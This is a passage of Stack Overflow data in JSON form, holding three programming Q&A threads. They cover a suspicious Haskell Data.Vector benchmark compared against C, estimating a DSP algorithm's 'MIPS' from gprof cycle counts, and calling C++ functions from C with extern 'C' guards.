"https://i.stack.imgur.com/lrdeC.jpg?s=128&g=1", "display_name": "Anton Malyshev", "link": "https://stackoverflow.com/users/4117097/anton-malyshev"}, "edited": false, "score": 0, "creation_date": 1518013735, "post_id": 48666065, "comment_id": 84329965, "body": "Post the command line, how you compile your C code, probably no optimization flags there"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518014153, "post_id": 48666065, "comment_id": 84330298, "body": "Your C benchmark appears to be calling the function under test indirectly, via a pointer.  This is unlikely to produce results reflective of the speed of calling the same function directly."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518014312, "post_id": 48666065, "comment_id": 84330420, "body": "Your C benchmark is also inefficient in how it records the <code>Foo</code> values: it updates a local <code>Foo</code> with them, and then updates an array element from that, which copies each value twice."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518014600, "post_id": 48666065, "comment_id": 84330623, "body": "I can&#39;t speak much to the Haskell, but are you sure the elements of your vector are stored <i>by value</i>, as the elements of your C array are?  If they were instead stored <i>by reference</i> then that might well be faster to manipulate, and the semantics would be inequivalent to those of your C benchmark."}, {"owner": {"reputation": 44013, "user_id": 1477667, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/trgKM.jpg?s=128&g=1", "display_name": "dfeuer", "link": "https://stackoverflow.com/users/1477667/dfeuer"}, "edited": false, "score": 3, "creation_date": 1518014645, "post_id": 48666065, "comment_id": 84330657, "body": "It&#39;s quite unlikely that it&#39;s actually populating a vector in a nanosecond. It seems quite likely it&#39;s optimizing your whole program away as unused in one way or another."}, {"owner": {"reputation": 13734, "user_id": 938694, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/b6678a430a805dd78366d6e135b49f2d?s=128&d=identicon&r=PG", "display_name": "Cubic", "link": "https://stackoverflow.com/users/938694/cubic"}, "edited": false, "score": 1, "creation_date": 1518014824, "post_id": 48666065, "comment_id": 84330768, "body": "Include the actual C code in your question, not just a link to it. Your question is meaningless without the code you&#39;re comparing."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518015014, "post_id": 48666065, "comment_id": 84330916, "body": "The real question is: what makes you think you can get picosecond accuracy benchmarks on a bloody PC?"}, {"owner": {"reputation": 389, "user_id": 3209516, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2c1df69a0524ff3c85a132c343e9930?s=128&d=identicon&r=PG&f=1", "display_name": "piotrMocz", "link": "https://stackoverflow.com/users/3209516/piotrmocz"}, "reply_to_user": {"reputation": 7970, "user_id": 4117097, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lrdeC.jpg?s=128&g=1", "display_name": "Anton Malyshev", "link": "https://stackoverflow.com/users/4117097/anton-malyshev"}, "edited": false, "score": 0, "creation_date": 1518015279, "post_id": 48666065, "comment_id": 84331132, "body": "@AntonMalyshev I updated the question."}, {"owner": {"reputation": 389, "user_id": 3209516, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2c1df69a0524ff3c85a132c343e9930?s=128&d=identicon&r=PG&f=1", "display_name": "piotrMocz", "link": "https://stackoverflow.com/users/3209516/piotrmocz"}, "reply_to_user": {"reputation": 44013, "user_id": 1477667, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/trgKM.jpg?s=128&g=1", "display_name": "dfeuer", "link": "https://stackoverflow.com/users/1477667/dfeuer"}, "edited": false, "score": 0, "creation_date": 1518015304, "post_id": 48666065, "comment_id": 84331149, "body": "@dfeuer true. I simplified the code a bit to extract the minimal example. In my original code (with the structs more complex, but still nothing unusual) the timing was more reasonable. This is why I&#39;m curious what is wrong in the haskell code/the benchmark."}, {"owner": {"reputation": 7970, "user_id": 4117097, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lrdeC.jpg?s=128&g=1", "display_name": "Anton Malyshev", "link": "https://stackoverflow.com/users/4117097/anton-malyshev"}, "edited": false, "score": 0, "creation_date": 1518016246, "post_id": 48666065, "comment_id": 84331811, "body": "@piotrMocz you can compare assembler outputs for gcc and the haskell compiler then, probably AVX is used there"}, {"owner": {"reputation": 24028, "user_id": 383200, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a9dc722f936cb1059adaae4fe39c07f0?s=128&d=identicon&r=PG", "display_name": "Carl", "link": "https://stackoverflow.com/users/383200/carl"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518023069, "post_id": 48666065, "comment_id": 84336656, "body": "@Lundin criterion uses pretty advanced statistical methods for its benchmarks - and it reports error terms, too.  It certainly has the ability to benchmark sub-nanosecond timings.  I would expect huge error terms in the cases where it does, though, and those weren&#39;t reported."}, {"owner": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "edited": false, "score": 1, "creation_date": 1518025475, "post_id": 48666065, "comment_id": 84338068, "body": "It\u2019s not <i>impossible</i> that ghc might deduce that a vector operation can be vectorized or parallelized when gcc can\u2019t do the same for a translation into C. One aspect of C that\u2019s showing its age is that you have to write all your vector operations as sequential loops that potentially can muck around with any element or the loop index itself in arbitrary ways, especially once pointer aliasing gets involved. Then, today, what you really want the compiler to do is figure out, <i>oh, you\u2019re just performing the same operations on <code>i</code> or <code>a[i]</code> for each element,</i> and optimize to <code>forall</code> semantics."}, {"owner": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "edited": false, "score": 1, "creation_date": 1518025573, "post_id": 48666065, "comment_id": 84338133, "body": "But you\u2019re right to be skeptical.  You might try compiling with <code>-S</code> and checking the assembly code. But maybe the C version would benefit from a <code>#pragma omp</code> directive."}, {"owner": {"reputation": 62421, "user_id": 216164, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/786f224adbe0784cdf7d0f15476061fe?s=128&d=identicon&r=PG", "display_name": "Thomas M. DuBuisson", "link": "https://stackoverflow.com/users/216164/thomas-m-dubuisson"}, "edited": false, "score": 0, "creation_date": 1518026506, "post_id": 48666065, "comment_id": 84338703, "body": "These unsafe thaw&#39;s and freezes are all violating the guarantee you are (implicitly) giving by making the call.  I wouldn&#39;t trust the code any further than I can throw my mainframe, let alone for benchmark numbers.  Want to use a mutable vector? Then use a mutable vector, stop pretending an immutable vector is mutable with all sorts of dishonest calls."}, {"owner": {"reputation": 389, "user_id": 3209516, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2c1df69a0524ff3c85a132c343e9930?s=128&d=identicon&r=PG&f=1", "display_name": "piotrMocz", "link": "https://stackoverflow.com/users/3209516/piotrmocz"}, "reply_to_user": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "edited": false, "score": 0, "creation_date": 1518045445, "post_id": 48666065, "comment_id": 84348319, "body": "@Davislor As far as I could tell, the Haskell-generated assembly didn&#39;t contain any vectorized instructions. Still, even if it used vectors heavily, the picosecond times suggest it&#39;s actually a problem of not evaluating the computation. I will try to produce a better example tomorrow."}, {"owner": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "edited": false, "score": 0, "creation_date": 1518045639, "post_id": 48666065, "comment_id": 84348392, "body": "Yeah. You could see if a <code>seq</code> or <code>$!</code> in the right place fixes it?"}, {"owner": {"reputation": 12194, "user_id": 4474419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/04ce27f0ebe4713b51911cd8475c3b42?s=128&d=identicon&r=PG", "display_name": "Davislor", "link": "https://stackoverflow.com/users/4474419/davislor"}, "edited": false, "score": 0, "creation_date": 1518049588, "post_id": 48666065, "comment_id": 84349571, "body": "Another possibility: benchmark a call through FFI?"}], "answers": [{"tags": [], "owner": {"reputation": 62421, "user_id": 216164, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/786f224adbe0784cdf7d0f15476061fe?s=128&d=identicon&r=PG", "display_name": "Thomas M. DuBuisson", "link": "https://stackoverflow.com/users/216164/thomas-m-dubuisson"}, "is_accepted": true, "score": 1, "last_activity_date": 1518049740, "creation_date": 1518049740, "answer_id": 48675581, "question_id": 48666065, "link": "https://stackoverflow.com/questions/48666065/surprisingly-low-times-when-benchmarking-data-vector/48675581#48675581", "title": "Surprisingly low times when benchmarking Data.Vector", "body": "<p>While I don't trust the benchmarking code I also can not reproduce the issue.  I modified the Haskell gist (just removed the second two benchmarks) and the C benchmark (made it perform the operation 1000 times then divided the times by 1000).</p>\n\n<p>EDIT: I don't trust the code because:</p>\n\n<ol>\n<li>You are using unsafe* calls that have implicit contracts you violate.</li>\n<li>The code doesn't even compile - you have a typo and a missing language extension.  This is usually an indication of other shenanigans.</li>\n</ol>\n\n<p><strong>My Results</strong></p>\n\n<p>What is the result? Spot on, no oddities here.</p>\n\n<pre><code>% gcc bench.c -O3 &amp;&amp; ./a.out\nStarting the benchmark\n[[ Malloced-array-[10000000] ]]Time taken: 11.904249 ms (cpu) 11.904249 ms (wall)\nDone\n./a.out  11.78s user 0.14s system 98% cpu 12.131 total\n</code></pre>\n\n<p>i.e. <strong>11ms</strong> for C at 10^7 elements.</p>\n\n<p>and</p>\n\n<pre><code>% ghc -O2 bench.hs &amp;&amp; ./bench\nbenchmarking Storable vector (FAKE mutable)/10e6\ntime                 2.362 ms   (2.236 ms .. 2.561 ms)\n                     0.953 R\u00b2   (0.909 R\u00b2 .. 0.989 R\u00b2)\nmean                 2.344 ms   (2.268 ms .. 2.482 ms)\nstd dev              305.0 \u03bcs   (169.1 \u03bcs .. 477.1 \u03bcs)\nvariance introduced by outliers: 79% (severely inflated)\n\nbenchmarking Storable vector (FAKE mutable)/10e7\ntime                 23.37 ms   (22.13 ms .. 24.73 ms)\n                     0.989 R\u00b2   (0.979 R\u00b2 .. 0.996 R\u00b2)\nmean                 23.19 ms   (22.63 ms .. 23.76 ms)\nstd dev              1.287 ms   (1.015 ms .. 1.713 ms)\nvariance introduced by outliers: 19% (moderately inflated)\n\nbenchmarking Storable vector (FAKE mutable)/10e8\ntime                 232.2 ms   (215.1 ms .. 247.3 ms)\n                     0.994 R\u00b2   (0.974 R\u00b2 .. 1.000 R\u00b2)\nmean                 223.5 ms   (215.9 ms .. 231.5 ms)\nstd dev              10.41 ms   (7.887 ms .. 13.06 ms)\nvariance introduced by outliers: 14% (moderately inflated)\n</code></pre>\n\n<p>i.e. <strong>23ms</strong> for Haskell at 10^7 result.</p>\n\n<p>This is on a moderately new macbook with GHC 8.2.</p>\n"}], "owner": {"reputation": 389, "user_id": 3209516, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2c1df69a0524ff3c85a132c343e9930?s=128&d=identicon&r=PG&f=1", "display_name": "piotrMocz", "link": "https://stackoverflow.com/users/3209516/piotrmocz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 135, "favorite_count": 0, "closed_date": 1518115908, "accepted_answer_id": 48675581, "answer_count": 1, "score": 4, "last_activity_date": 1518049740, "creation_date": 1518013007, "last_edit_date": 1518015495, "question_id": 48666065, "link": "https://stackoverflow.com/questions/48666065/surprisingly-low-times-when-benchmarking-data-vector", "closed_reason": "Duplicate", "title": "Surprisingly low times when benchmarking Data.Vector", "body": "<p>I am benchmarking Haskell's array libraries (the <code>array</code> and <code>vector</code> packages) to come up with the best way of storing large data for my use case. I am using <code>criterion</code> as the benchmarking tool.</p>\n\n<p><strong>Long story short:</strong> my code simply allocates a vector and proceeds to fill it with simple structs (1M, 10M, and 100M elements, respectively). When I compare the Haskell benchmark times with a simple reference implementation I wrote in C, Haskell is a few times faster and I find it suspicious: the C code is a simple loop filling the structs in the array.</p>\n\n<p><strong>The question:</strong> is it possible for Haskell's <code>vector</code> library to beat C in terms of performance? Or does it mean my benchmarks are flawed/something is not actually evaluated/there's some 'gotcha'?</p>\n\n<p><strong>Another question</strong> how to make sure that the Haskell vectors are actually evaluated?</p>\n\n<p><strong>Longer explanation:</strong> The task at hand is to fill a vector with a large number of structs. They have <code>Storable</code> instances and the vector used is <code>Data.Vector.Storable</code>.</p>\n\n<p>The data type is the following:</p>\n\n<pre><code>data Foo = Foo Int Int deriving (Show, Eq, Generic, NFData)\n</code></pre>\n\n<p>And the <code>Storable</code> instances look like this:</p>\n\n<pre><code>chunkSize :: Int\nchunkSize = sizeOf (undefined :: Int)\n{-# INLINE chunkSize #-}\n\ninstance Storable Foo where\n    sizeOf    _ = 2 * chunkSize ; {-# INLINE sizeOf    #-}\n    alignment _ = chunkSize     ; {-# INLINE alignment #-}\n    peek ptr = Foo\n        &lt;$&gt; peekByteOff ptr 0\n        &lt;*&gt; peekByteOff ptr chunkSize\n    {-# INLINE peek #-}\n    poke ptr (Foo a b) = do\n        pokeByteOff ptr 0 a\n        pokeByteOff ptr chunkSize b\n    {-# INLINE poke #-}\n</code></pre>\n\n<p>The serialization itself seems to work fine. The vector is then allocated:</p>\n\n<pre><code>mkFooVec :: Int -&gt; IO (Vector Foo)\nmkFooVec !i = unsafeFreeze =&lt;&lt; new (i + 1)\n</code></pre>\n\n<p>And populated with the structs:</p>\n\n<pre><code>populateFooVec :: Int -&gt; Vector Foo -&gt; IO (Vector Foo)\npopulateFooVec !i !v = do\n    v' &lt;- unsafeThaw v\n    let go 0 = return ()\n        go j = unsafeWrite v' j (Foo j $ j + 1) &gt;&gt; go (j - 1)\n    go i\n    unsafeFreeze v'\n</code></pre>\n\n<p>Benchmark is the standard criterion one:</p>\n\n<pre><code>    defaultMain [\n      bgroup \"Storable vector (mutable)\"\n        $ (\\(i :: Int) -&gt; env (mkFooVec (10 ^ i))\n        $ \\v -&gt; bench (\"10e\" &lt;&gt; show i)\n        $ nfIO (populateFooVec (10 ^ i) v))  &lt;$&gt; [6..8]\n    ]\n</code></pre>\n\n<p>The <a href=\"https://gist.github.com/piotrMocz/2a600bc2bf678cf26b988da662a3d37a\" rel=\"nofollow noreferrer\">gist</a> contains other benchmarks, trying to force evaluation in different ways.</p>\n\n<p>Reference C code doing more or less the same can be found <a href=\"https://gist.github.com/piotrMocz/158efc264503d5e487263e092985f656\" rel=\"nofollow noreferrer\">here (gist)</a>. The main logic is the following:</p>\n\n<pre><code>Foo *allocFoos(long n) {\n    return (Foo *) malloc(n * sizeof(Foo));\n}\n\n// populate the array with structs:\nvoid createFoos(Foo *v, long n) {\n    for (long i = 0; i &lt; n; ++i) {\n        v[i].name = i;\n        v[i].id = i + 1;\n    }\n}\n</code></pre>\n\n<p>And the command used to run it: <code>gcc -O2 -o bench benchmark.c &amp;&amp; ./bench</code></p>\n\n<p>Now when I run the benchmarks, the C code takes about 50ms, while Criterion reports results around 800 picoseconds (!). This makes me wonder: maybe I'm interpreting the results wrong? Maybe the vector isn't actually evaluated (although if you look at the Haskell gist, I try to force the evaluation in different ways). What am I doing wrong? If nothing -- how does <code>vector</code> beat a simple for loop in C (that GCC further unrolls, btw)?</p>\n\n<p>Please pardon my terribly long question, I was trying to give the whole context ;)</p>\n"}, {"tags": ["c", "debugging", "profiling", "signal-processing"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 2, "creation_date": 1518014879, "post_id": 48665867, "comment_id": 84330822, "body": "If by &quot;MIPS&quot; you mean &quot;millions of instructions per second&quot;, then your question doesn&#39;t even make sense.  That&#39;s a measure of a processor&#39;s capabilities, not a characteristic of a program or algorithm."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1518015042, "post_id": 48665867, "comment_id": 84330943, "body": "Moreover, I don&#39;t know about your particular DSP, but it is common for processors to take more than one cycle to execute an instruction, so the number of cycles expended during a computation does not directly tell you how many instructions were executed.  In any case, you need the corresponding clock rate to convert a cycle count to a time."}, {"owner": {"reputation": 6534, "user_id": 1202172, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8587094fc4666bee5d5852f163e6f86b?s=128&d=identicon&r=PG", "display_name": "Danijel", "link": "https://stackoverflow.com/users/1202172/danijel"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518015224, "post_id": 48665867, "comment_id": 84331094, "body": "Added more info. I agree, but I think it is clear what the question is about."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518015250, "post_id": 48665867, "comment_id": 84331111, "body": "Finally, the cost, in instruction equivalents, of a particular computation is not &quot;taken out of&quot; a processor&#39;s processing rate in any absolute sense.  Rather, the two together give you a lower bound on how long the computation will take."}, {"owner": {"reputation": 6534, "user_id": 1202172, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8587094fc4666bee5d5852f163e6f86b?s=128&d=identicon&r=PG", "display_name": "Danijel", "link": "https://stackoverflow.com/users/1202172/danijel"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518017330, "post_id": 48665867, "comment_id": 84332601, "body": "It took 6846310893 cycles to process 45 sec * 16000 audio samples, which gives 9508.76 cycles/ audio sample. If DSP clock runs at 600 MHz (and 1 instruction per cycle), this gives 63100 samples/sec. Meaning my DSP can run about 4 mono channels through this algorithm, no more (4 * 16000 Hz). So if DSP runs 600 MIPS, this algo takes about 1/4, 150 MIPS. Not sure if this makes sense."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518017388, "post_id": 48665867, "comment_id": 84332652, "body": "If you&#39;re asking about how many audio streams your target DSP can process <i>in real time</i>, then you should certainly clarify your question to so indicate."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518017472, "post_id": 48665867, "comment_id": 84332719, "body": "But it also sounds like you have answered that question yourself, already."}, {"owner": {"reputation": 6534, "user_id": 1202172, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8587094fc4666bee5d5852f163e6f86b?s=128&d=identicon&r=PG", "display_name": "Danijel", "link": "https://stackoverflow.com/users/1202172/danijel"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518081094, "post_id": 48665867, "comment_id": 84360215, "body": "No, that&#39;s not what I was asking. I wanted to know algorithms part in the overall processor &quot;MIPS&quot; capability."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1518101004, "post_id": 48665867, "comment_id": 84374066, "body": "Again, @Danijel, an algorithm has no part in or direct relation to the processing capacity of the machine on which it runs.  &quot;MIPS&quot; is not meaningfully defined for algorithms.  Rather, a particular job that uses an algorithm on specific input data involves executing a some number of instructions (measurable in MI, not MIPS), and the speed of the processor on which it runs (<i>that</i> measurable in MIPS) puts a lower bound on the time it will take to run that job."}], "answers": [{"tags": [], "owner": {"reputation": 6534, "user_id": 1202172, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8587094fc4666bee5d5852f163e6f86b?s=128&d=identicon&r=PG", "display_name": "Danijel", "link": "https://stackoverflow.com/users/1202172/danijel"}, "is_accepted": true, "score": 0, "last_activity_date": 1519218724, "creation_date": 1519218724, "answer_id": 48906861, "question_id": 48665867, "link": "https://stackoverflow.com/questions/48665867/calculate-mips-after-running-gprof/48906861#48906861", "title": "Calculate MIPS after running gprof?", "body": "<p>OK...<br>\n<code>6846310893</code> cycles per <code>45</code> seconds is: <code>152.14</code> \"MIPS\", meaning my 600 MHz processor can (nearly) execute 4 of these in real-time. </p>\n"}], "owner": {"reputation": 6534, "user_id": 1202172, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8587094fc4666bee5d5852f163e6f86b?s=128&d=identicon&r=PG", "display_name": "Danijel", "link": "https://stackoverflow.com/users/1202172/danijel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 129, "favorite_count": 0, "accepted_answer_id": 48906861, "answer_count": 1, "score": -1, "last_activity_date": 1519218724, "creation_date": 1518012406, "last_edit_date": 1518027439, "question_id": 48665867, "link": "https://stackoverflow.com/questions/48665867/calculate-mips-after-running-gprof", "title": "Calculate MIPS after running gprof?", "body": "<p>My audio DSP algorithm processes input sound file (45 seconds of 16 kHz audio). After simulation is done, <code>gprof</code> profiler tells me:  </p>\n\n<p><code>Cycles: total = 6846310893</code> </p>\n\n<p>Is this enough information to calculate this algorithm's \"MIPS\"? </p>\n\n<p>Let's say my target DSP processor is \"100 MIPS\".<br>\nHow much will this algo take out of those 100?</p>\n\n<p><strong>Edit</strong>:<br>\nProcessor executes 1 instruction per cycle.<br>\nProcessor runs at 600 MHz. </p>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 13397, "user_id": 2287576, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/iCua4.jpg?s=128&g=1", "display_name": "Andrew Truckle", "link": "https://stackoverflow.com/users/2287576/andrew-truckle"}, "edited": false, "score": 0, "creation_date": 1518012174, "post_id": 48665748, "comment_id": 84328880, "body": "Missing ; in header???"}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "edited": false, "score": 3, "creation_date": 1518012440, "post_id": 48665748, "comment_id": 84329051, "body": "IINM you need to remove the <code>extern &quot;C&quot;</code> from the C side. The easiest way is to make it a macro that is toggled by <code>#ifdef __cplusplus</code>."}], "answers": [{"comments": [{"owner": {"reputation": 249, "user_id": 8321082, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/f8c9aaffcc9327cdaff6d451f56e2200?s=128&d=identicon&r=PG&f=1", "display_name": "J Doe.", "link": "https://stackoverflow.com/users/8321082/j-doe"}, "edited": false, "score": 0, "creation_date": 1518013073, "post_id": 48665992, "comment_id": 84329495, "body": "Oh wow.. I finally understand this block of code that&#39;s littered throughout my codebase :) Thank you. Just to ask - does the <code>extern &quot;C&quot;</code> need to be present in the .cpp file?"}, {"owner": {"reputation": 1971, "user_id": 2096824, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fzfxa.jpg?s=128&g=1", "display_name": "Justin Randall", "link": "https://stackoverflow.com/users/2096824/justin-randall"}, "edited": false, "score": 0, "creation_date": 1518013672, "post_id": 48665992, "comment_id": 84329920, "body": "Nice concise answer to a good question.  It&#39;s also worth mentioning that <code>extern &quot;C&quot; { }</code> is simply telling the C++ compiler not to <a href=\"https://stackoverflow.com/questions/2937273/questions-about-name-mangling-in-c\">mangle the function names</a>, which is why a C compiler will choke on it."}], "tags": [], "owner": {"reputation": 10627, "user_id": 1537925, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/U8DRJ.png?s=128&g=1", "display_name": "The Vee", "link": "https://stackoverflow.com/users/1537925/the-vee"}, "is_accepted": true, "score": 9, "last_activity_date": 1518014696, "last_edit_date": 1518014696, "creation_date": 1518012752, "answer_id": 48665992, "question_id": 48665748, "link": "https://stackoverflow.com/questions/48665748/calling-c-class-functions-in-c-file-using-extern-c/48665992#48665992", "title": "Calling C++ class functions in C file using extern &quot;C&quot;", "body": "<p>There's no <code>extern \"C\"</code> in C: a C compiler won't understand this and will choke on it. You need to expose this directive to the C++ compiler only. This is why often in such headers you find this instead (a random example e.g. <a href=\"https://github.com/madler/zlib/blob/master/zlib.h\" rel=\"nofollow noreferrer\">here</a>):</p>\n\n<pre><code>#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n... code ...\n\n#ifdef __cplusplus\n}\n#endif\n</code></pre>\n\n<p>The C preprocessor will remove the <code>extern \"C\"</code>, keeping the enclosed code only, while for the C++ compiler, the same file will look like</p>\n\n<pre><code>extern \"C\" {\n... code ...\n}\n</code></pre>\n\n<p><strong>Update:</strong> A few words on the purpose of the whole <code>extern \"C\"</code> construct, and why it only appears in C++, as suggested by Justin Randall in the comments. Perhaps the leading reason why this is needed is that it prevents <a href=\"https://en.wikipedia.org/wiki/Name_mangling\" rel=\"nofollow noreferrer\">name mangling</a>. This is important when overloaded functions of the same name exist: mangled names are made unique, so these can be distinguished. On the other hand, there is no overloading in C, so no name mangling either and no need for the <code>extern</code> block.</p>\n\n<p>Long story short, a typical C++ compiler would tend to rename a function like <code>void f()</code>, for example, to something like <code>_Z1fv</code>. But the C compiler would look for <code>f</code> and fail. <code>extern \"C\"</code> makes the former use the same symbol name the latter would expect.</p>\n\n<p>More precise information can be found <a href=\"http://en.cppreference.com/w/cpp/language/language_linkage\" rel=\"nofollow noreferrer\">here</a>.</p>\n"}], "owner": {"reputation": 249, "user_id": 8321082, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/f8c9aaffcc9327cdaff6d451f56e2200?s=128&d=identicon&r=PG&f=1", "display_name": "J Doe.", "link": "https://stackoverflow.com/users/8321082/j-doe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 148, "favorite_count": 1, "accepted_answer_id": 48665992, "answer_count": 1, "score": 2, "last_activity_date": 1518014696, "creation_date": 1518012038, "last_edit_date": 1518012157, "question_id": 48665748, "link": "https://stackoverflow.com/questions/48665748/calling-c-class-functions-in-c-file-using-extern-c", "title": "Calling C++ class functions in C file using extern &quot;C&quot;", "body": "<p>I am trying to use <code>extern \"C\"</code> to be able to call a C++ class within a different C file. I can build this fine until I actually include the <code>.h</code> in the C file I want to call the C++ class from. 